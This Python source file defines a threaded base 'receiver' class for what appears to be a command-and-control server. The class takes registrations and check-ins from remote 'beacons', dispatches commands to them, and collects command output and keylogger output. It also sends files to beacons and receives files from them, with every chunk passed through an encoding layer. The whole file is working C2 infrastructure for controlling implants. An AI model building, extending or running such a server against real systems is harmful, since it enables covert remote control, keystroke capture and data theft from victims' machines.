from abc import abstractmethod
from enum import Enum
from typing import Optional, Dict, Any, Callable
from dataclasses import dataclass
from PyQt6.QtCore import QObject, pyqtSignal, QMetaObject, Qt, pyqtSlot
import threading
import time
import socket
from pathlib import Path
from werkzeug.utils import secure_filename
from .encoding_strategies import EncodingStrategy
import utils
from config import ServerConfig

class ReceiverStatus(Enum):
    """Receiver status enumeration"""
    STOPPED = "stopped"
    STARTING = "starting"
    RUNNING = "running"
    STOPPING = "stopping"
    ERROR = "error"

@dataclass
class ReceiverStats:
    """Statistics for a receiver instance"""
    total_connections: int = 0
    active_connections: int = 0
    bytes_received: int = 0
    bytes_sent: int = 0
    uptime_seconds: int = 0
    last_connection_time: Optional[float] = None
    error_count: int = 0

class BaseReceiver(QObject):
    """Abstract base class for all receiver implementations"""
    
    # PyQt signals for status updates
    status_changed = pyqtSignal(str)  # receiver_id
    connection_received = pyqtSignal(str, str)  # receiver_id, client_address
    error_occurred = pyqtSignal(str, str)  # receiver_id, error_message
    stats_updated = pyqtSignal(str)  # receiver_id
    
    def __init__(self, receiver_id: str, name: str, encoding_strategy: EncodingStrategy):
        super().__init__()
        self.receiver_id = receiver_id
        self.name = name
        self.encoding_strategy = encoding_strategy
        self.status = ReceiverStatus.STOPPED
        self.stats = ReceiverStats()
        self.start_time: Optional[float] = None
        self._shutdown_event = threading.Event()
        self._receiver_thread: Optional[threading.Thread] = None
        self._stats_lock = threading.Lock()  # Thread safety for stats
        
        # Connection handlers
        self.command_processor: Optional[Any] = None
        self.file_transfer_service: Optional[Any] = None
        
    @abstractmethod
    def _setup_receiver(self) -> bool:
        """Setup the receiver (bind ports, configure listeners, etc.)"""
        pass
        
    @abstractmethod
    def _start_listening(self):
        """Start the main listening loop"""
        pass
        
    @abstractmethod
    def _cleanup_receiver(self):
        """Cleanup receiver resources"""
        pass
        
    @abstractmethod
    def get_configuration(self) -> Dict[str, Any]:
        """Get receiver-specific configuration"""
        pass
        
    @abstractmethod
    def update_configuration(self, config: Dict[str, Any]) -> bool:
        """Update receiver configuration"""
        pass
        
    def start(self) -> bool:
        """Start the receiver"""
        if self.status != ReceiverStatus.STOPPED:
            return False
            
        try:
            self._set_status(ReceiverStatus.STARTING)
            
            if not self._setup_receiver():
                self._set_status(ReceiverStatus.ERROR)
                return False
                
            self.start_time = time.time()
            self._shutdown_event.clear()
            
            # Start receiver in separate thread
            self._receiver_thread = threading.Thread(
                target=self._receiver_loop,
                name=f"Receiver-{self.receiver_id}",
                daemon=True
            )
            self._receiver_thread.start()
            
            self._set_status(ReceiverStatus.RUNNING)
            return True
            
        except Exception as e:
            self._set_status(ReceiverStatus.ERROR)
            self.error_occurred.emit(self.receiver_id, str(e))
            return False
            
    def stop(self) -> bool:
        """Stop the receiver"""
        if self.status != ReceiverStatus.RUNNING:
            return False
            
        try:
            self._set_status(ReceiverStatus.STOPPING)
            self._shutdown_event.set()
            
            # Wait for receiver thread to finish
            if self._receiver_thread and self._receiver_thread.is_alive():
                self._receiver_thread.join(timeout=5)
                
            self._cleanup_receiver()
            self._set_status(ReceiverStatus.STOPPED)
            return True
            
        except Exception as e:
            self._set_status(ReceiverStatus.ERROR)
            self.error_occurred.emit(self.receiver_id, str(e))
            return False
            
    def restart(self) -> bool:
        """Restart the receiver"""
        if not self.stop():
            return False
        return self.start()
        
    def _receiver_loop(self):
        """Main receiver loop - runs in dedicated thread"""
        try:
            self._start_listening()
        except Exception as e:
            self.error_occurred.emit(self.receiver_id, str(e))
            self._set_status(ReceiverStatus.ERROR)
            
    def _set_status(self, new_status: ReceiverStatus):
        """Update receiver status and emit signal"""
        if self.status != new_status:
            self.status = new_status
            # Emit signal in thread-safe manner
            QMetaObject.invokeMethod(
                self, "_emit_status_changed", 
                Qt.ConnectionType.QueuedConnection
            )
    
    @pyqtSlot()
    def _emit_status_changed(self):
        """Emit status changed signal (called in main thread)"""
        self.status_changed.emit(self.receiver_id)
            
    def _update_stats(self, **kwargs):
        """Update receiver statistics with thread-safe signal emission"""
        with self._stats_lock:
            for key, value in kwargs.items():
                if hasattr(self.stats, key):
                    setattr(self.stats, key, value)
                    
            # Update uptime
            if self.start_time and self.status == ReceiverStatus.RUNNING:
                self.stats.uptime_seconds = int(time.time() - self.start_time)
                
        # Emit signal in thread-safe manner
        QMetaObject.invokeMethod(
            self, "_emit_stats_updated", 
            Qt.ConnectionType.QueuedConnection
        )
    
    @pyqtSlot()
    def _emit_stats_updated(self):
        """Emit stats updated signal (called in main thread)"""
        self.stats_updated.emit(self.receiver_id)
    
    def increment_active_connections(self):
        """Thread-safe increment of active connections"""
        with self._stats_lock:
            self.stats.active_connections += 1
            self.stats.total_connections += 1
        self._trigger_stats_update()
    
    def decrement_active_connections(self):
        """Thread-safe decrement of active connections"""
        with self._stats_lock:
            self.stats.active_connections = max(0, self.stats.active_connections - 1)
        self._trigger_stats_update()
    
    def update_bytes_received(self, bytes_count: int):
        """Thread-safe update of bytes received"""
        with self._stats_lock:
            self.stats.bytes_received += bytes_count
            self.stats.last_connection_time = time.time()
    
    def update_bytes_sent(self, bytes_count: int):
        """Thread-safe update of bytes sent"""
        with self._stats_lock:
            self.stats.bytes_sent += bytes_count
    
    def _trigger_stats_update(self):
        """Trigger a stats update signal emission"""
        QMetaObject.invokeMethod(
            self, "_emit_stats_updated", 
            Qt.ConnectionType.QueuedConnection
        )
        
    def encode_data(self, data: bytes) -> bytes:
        """Encode data using the configured encoding strategy"""
        return self.encoding_strategy.encode(data)
        
    def decode_data(self, data: bytes) -> bytes:
        """Decode data using the configured encoding strategy"""
        return self.encoding_strategy.decode(data)
        
    def set_command_processor(self, processor):
        """Set the command processor for handling beacon commands"""
        self.command_processor = processor
        
    def set_file_transfer_service(self, service):
        """Set the file transfer service for handling file operations"""
        self.file_transfer_service = service
        
    def get_status_display(self) -> str:
        """Get human-readable status"""
        status_map = {
            ReceiverStatus.STOPPED: "Stopped",
            ReceiverStatus.STARTING: "Starting...",
            ReceiverStatus.RUNNING: "Running",
            ReceiverStatus.STOPPING: "Stopping...",
            ReceiverStatus.ERROR: "Error"
        }
        return status_map.get(self.status, "Unknown")
        
    def get_uptime_display(self) -> str:
        """Get formatted uptime string"""
        if not self.start_time or self.status != ReceiverStatus.RUNNING:
            return "N/A"
            
        uptime = int(time.time() - self.start_time)
        hours = uptime // 3600
        minutes = (uptime % 3600) // 60
        seconds = uptime % 60
        return f"{hours:02d}:{minutes:02d}:{seconds:02d}"
    
    # Common connection handling methods
    def _send_all(self, sock: socket.socket, data: bytes) -> int:
        """Ensure all data is sent via socket"""
        total_sent = 0
        while total_sent < len(data):
            sent = sock.send(data[total_sent:])
            if sent == 0:
                raise RuntimeError("Socket connection broken")
            total_sent += sent
        return total_sent
    
    @abstractmethod
    def _send_data(self, sock: socket.socket, data: bytes) -> bool:
        """Send data through the receiver's transport layer"""
        pass
    
    @abstractmethod
    def _receive_data(self, sock: socket.socket, buffer_size: int) -> bytes:
        """Receive data through the receiver's transport layer"""
        pass
    
    def handle_file_transfer(self, sock: socket.socket, command: str, parts: list, client_address: tuple):
        """Handle file transfer with encoding - common implementation"""
        import utils
        
        if len(parts) < 2:
            response = self.encoding_strategy.encode(b"ERROR|Invalid file transfer command")
            self._send_data(sock, response)
            return
            
        filename = utils.strip_filename_quotes(parts[1])
        config = ServerConfig()
        
        # Log the file transfer request for debugging
        if utils.logger:
            utils.logger.log_message(f"File transfer request: {command} - Original: '{parts[1]}' -> Processed: '{filename}'")
        
        if command == "to_beacon":
            # Send file (encoded)
            self._send_file(sock, filename, config)
        else:  # from_beacon
            # Receive file (encoded)
            ready_response = self.encoding_strategy.encode(b"READY")
            self._send_data(sock, ready_response)
            self._receive_file(sock, filename, config)
    
    def _send_file(self, sock: socket.socket, filename: str, config) -> bool:
        """Send file with encoding"""
        import utils
        
        try:
            # Use safe_filename_path instead of secure_filename to preserve spaces
            try:
                filepath = utils.safe_filename_path(Path(config.FILES_FOLDER), filename)
            except ValueError as e:
                if utils.logger:
                    utils.logger.log_message(f"Invalid filename '{filename}': {e}")
                error_response = self.encoding_strategy.encode(b'ERROR|Invalid filename')
                self._send_data(sock, error_response)
                return False
                
            if utils.logger:
                utils.logger.log_message(f"File transfer: Looking for file at {filepath}")
                
            if not filepath.exists():
                error_response = self.encoding_strategy.encode(b'ERROR|File not found')
                self._send_data(sock, error_response)
                if utils.logger:
                    utils.logger.log_message(f"File not found: {filepath}")
                return False
                
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1048576)
            
            CHUNK_SIZE = 1048576
            bytes_sent = 0
            
            with open(filepath, 'rb') as f:
                while True:
                    chunk = f.read(CHUNK_SIZE)
                    if not chunk:
                        break
                        
                    # Encode the chunk
                    encoded_chunk = self.encoding_strategy.encode(chunk)
                    bytes_sent += self._send_all(sock, encoded_chunk)
                    self.update_bytes_sent(len(encoded_chunk))
                    
            if utils.logger:
                utils.logger.log_message(f"File transfer complete: {filename} ({bytes_sent} bytes)")
            return True
            
        except Exception as e:
            if utils.logger:
                utils.logger.log_message(f"Error in file send: {e}")
            return False
            
    def _receive_file(self, sock: socket.socket, filename: str, config) -> bool:
        """Receive file with decoding"""
        import utils
        
        try:
            # Use safe_filename_path instead of secure_filename to preserve spaces
            try:
                filepath = utils.safe_filename_path(Path(config.FILES_FOLDER), filename)
            except ValueError as e:
                if utils.logger:
                    utils.logger.log_message(f"Invalid filename '{filename}': {e}")
                error_response = self.encoding_strategy.encode(b'ERROR|Invalid filename')
                self._send_data(sock, error_response)
                return False
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 1048576)
            
            with open(filepath, 'wb') as f:
                total_received = 0
                while True:
                    try:
                        encoded_chunk = self._receive_data(sock, 1048576)
                        if not encoded_chunk:
                            break
                            
                        # Decode the chunk
                        chunk = self.encoding_strategy.decode(encoded_chunk)
                        f.write(chunk)
                        
                        total_received += len(encoded_chunk)
                        self.update_bytes_received(len(encoded_chunk))
                        
                    except socket.timeout:
                        if total_received > 0:
                            break
                        raise
                        
            if total_received > 0:
                success_response = self.encoding_strategy.encode(b'SUCCESS')
                self._send_data(sock, success_response)
                self.update_bytes_sent(len(success_response))
                if utils.logger:
                    utils.logger.log_message(f"File received: {filename} ({total_received} bytes)")
                return True
            else:
                error_response = self.encoding_strategy.encode(b'ERROR|No data received')
                self._send_data(sock, error_response)
                return False
                
        except Exception as e:
            if utils.logger:
                utils.logger.log_message(f"Error in file receive: {e}")
            return False
    
    def process_received_data(self, raw_data: bytes, client_info: Dict[str, Any]) -> tuple[bytes, bool]:
        """
        Process received data in a transport-agnostic way
        
        Args:
            raw_data: Raw bytes received from client
            client_info: Client information dict (address, transport type, etc.)
            
        Returns:
            Tuple of (response_bytes, keep_connection_alive)
        """
        try:
            # Decode the data
            try:
                decoded_data = self.encoding_strategy.decode(raw_data)
                data_str = decoded_data.decode('utf-8').strip()
            except Exception as e:
                if utils.logger:
                    utils.logger.log_message(f"Decoding error from {client_info}: {e}")
                error_response = self.encoding_strategy.encode(b"ERROR|Decoding failed")
                return error_response, False
            
            # Update stats
            self.update_bytes_received(len(raw_data))
            
            # Parse command and handle
            parts = data_str.split('|')
            if not parts:
                error_response = self.encoding_strategy.encode(b"ERROR|Invalid command format")
                return error_response, False
            
            command = parts[0]
            
            # Handle file transfer commands
            if command in ("to_beacon", "from_beacon"):
                # File transfers require special handling by each transport
                # Return indication that this needs transport-specific processing
                return b"FILE_TRANSFER_REQUIRED", True
            
            # Process regular commands
            response_str = self._process_command_data(data_str, client_info)
            response_bytes = self.encoding_strategy.encode(response_str.encode('utf-8'))
            
            # Determine if connection should stay alive
            single_transaction_commands = {
                "register", "request_action", "checkin", "command_output", "keylogger_output"
            }
            keep_alive = command not in single_transaction_commands
            
            return response_bytes, keep_alive
            
        except Exception as e:
            if utils.logger:
                utils.logger.log_message(f"Error processing data from {client_info}: {e}")
            error_response = self.encoding_strategy.encode(b"ERROR|Processing failed")
            return error_response, False
    
    def _process_command_data(self, data_str: str, client_info: Dict[str, Any]) -> str:
        """Process command data and return response string"""
        parts = data_str.split('|')
        command = parts[0]
        
        try:
            # Use existing command processor logic
            if command == "command_output" and len(parts) >= 2:
                beacon_id = parts[1]
                output = '|'.join(parts[2:]) if len(parts) > 2 else ""
                return self.command_processor.process_command_output(beacon_id, output)
                
            elif command == "keylogger_output" and len(parts) >= 2:
                beacon_id = parts[1]
                output = data_str.split('|', 2)[2] if len(parts) > 2 else ""
                return self.command_processor.process_keylogger_output(beacon_id, output)
                
            else:
                # Standard command dispatch
                response = {
                    "register": lambda: self.command_processor.process_registration(
                        parts[1], parts[2], self.receiver_id, self.name
                    ) if len(parts) == 3 else "Invalid registration format",
                    
                    "request_action": lambda: self.command_processor.process_action_request(
                        parts[1], self.receiver_id, self.name
                    ) if len(parts) == 2 else "Invalid request format",
                    
                    "download_complete": lambda: self.command_processor.process_download_status(
                        parts[1], parts[2], "download_complete"
                    ) if len(parts) == 3 else "Invalid download status format",
                    
                    "download_failed": lambda: self.command_processor.process_download_status(
                        parts[1], parts[2], "download_failed"
                    ) if len(parts) == 3 else "Invalid download status format",
                    
                    "checkin": lambda: "Check-in acknowledged"
                        if len(parts) == 2 else "Invalid checkin format",
                }.get(command, lambda: "Unknown command")()
                
                return response
                
        except Exception as e:
            if utils.logger:
                utils.logger.log_message(f"Error processing command {command}: {e}")
            return f"ERROR|Command processing failed: {e}"

    def handle_command_processing(self, sock: socket.socket, initial_data: str, client_address: tuple):
        """Handle command processing with encoding - legacy method for TCP connections"""
        try:
            # Use new unified processing for initial data
            client_info = {"address": client_address, "transport": "tcp"}
            response_bytes, keep_alive = self.process_received_data(initial_data.encode('utf-8'), client_info)
            
            # Handle special cases
            if response_bytes == b"FILE_TRANSFER_REQUIRED":
                # Let the TCP receiver handle file transfer
                parts = initial_data.split('|')
                self.handle_file_transfer(sock, parts[0], parts, client_address)
                return
            
            # Send response
            self._send_data(sock, response_bytes)
            self.update_bytes_sent(len(response_bytes))
            
            if not keep_alive:
                return
                
            # Continue processing additional messages for persistent connections
            while True:
                try:
                    data_raw = self._receive_data(sock, getattr(self, 'buffer_size', 1048576))
                    if not data_raw:
                        break
                        
                    response_bytes, keep_alive = self.process_received_data(data_raw, client_info)
                    
                    if response_bytes == b"FILE_TRANSFER_REQUIRED":
                        data_str = self.encoding_strategy.decode(data_raw).decode('utf-8')
                        parts = data_str.split('|')
                        self.handle_file_transfer(sock, parts[0], parts, client_address)
                        continue
                    
                    self._send_data(sock, response_bytes)
                    self.update_bytes_sent(len(response_bytes))
                    
                    if not keep_alive:
                        break
                        
                except socket.timeout:
                    continue
                except Exception as e:
                    if utils.logger:
                        utils.logger.log_message(f"Error processing command from {client_address}: {e}")
                    break
                    
        except Exception as e:
            if utils.logger:
                utils.logger.log_message(f"Error in command handler for {client_address}: {e}")
    
